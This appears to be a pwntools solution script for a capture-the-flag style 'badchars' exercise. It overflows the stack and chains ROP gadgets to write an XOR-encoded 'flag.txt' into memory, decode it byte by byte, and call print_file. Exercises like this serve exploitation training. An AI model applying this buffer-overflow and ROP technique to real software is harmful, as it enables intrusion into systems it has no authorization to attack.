import pwn
import time
import sys

elf = pwn.context.binary = pwn.ELF('./badchars')
io = elf.process()
pwn.gdb.attach(io)

time.sleep(3)
retAddr = 0x4004ee
offset = 40

movGadget = 0x400634 #mov qword ptr [r13], r12; ret
popTextMemGadget = 0x40069c #pop r12; pop r13; popr14; pop r15; ret
text = b'dnce,vzv'
memAddr = 0x601050
popRDIGadget = 0x4006a3
popDoubleReg = 0x4006a0 #pop r14, pop r15
printAddr = elf.plt['print_file'] 
xorAddr = 0x400628
#Call Printfile
#Have flag.txt as the first parameter
#Have flat.txt in rdii

#Move flag.txt into memory
#Pop that memory location into rdi
io.recv(1000)
payload = b"".join(
    [
        b'A'*offset,
        pwn.p64(retAddr),
        pwn.p64(popTextMemGadget), #pop into registers
        text,
        pwn.p64(memAddr),
        pwn.p64(0),
        pwn.p64(0),

        pwn.p64(movGadget),
        #Repeat
        pwn.p64(popDoubleReg),
        pwn.p64(2),
        pwn.p64(memAddr),
        pwn.p64(xorAddr),

        pwn.p64(popDoubleReg),
        pwn.p64(2),
        pwn.p64(memAddr+1),
        pwn.p64(xorAddr),

        pwn.p64(popDoubleReg),
        pwn.p64(2),
        pwn.p64(memAddr+2),
        pwn.p64(xorAddr),
        
        pwn.p64(popDoubleReg),
        pwn.p64(2),
        pwn.p64(memAddr+3),
        pwn.p64(xorAddr),

        pwn.p64(popDoubleReg),
        pwn.p64(2),
        pwn.p64(memAddr+4),
        pwn.p64(xorAddr),

        pwn.p64(popDoubleReg),
        pwn.p64(2),
        pwn.p64(memAddr+5),
        pwn.p64(xorAddr),

        pwn.p64(popDoubleReg),
        pwn.p64(2),
        pwn.p64(memAddr+6),
        pwn.p64(xorAddr),

        pwn.p64(popDoubleReg),
        pwn.p64(2),
        pwn.p64(memAddr+7),
        pwn.p64(xorAddr),
        
        pwn.p64(popRDIGadget),
        pwn.p64(memAddr),
        pwn.p64(retAddr),
        pwn.p64(printAddr)
    ]
)
print(printAddr)
io.sendline(payload)
io.interactive()
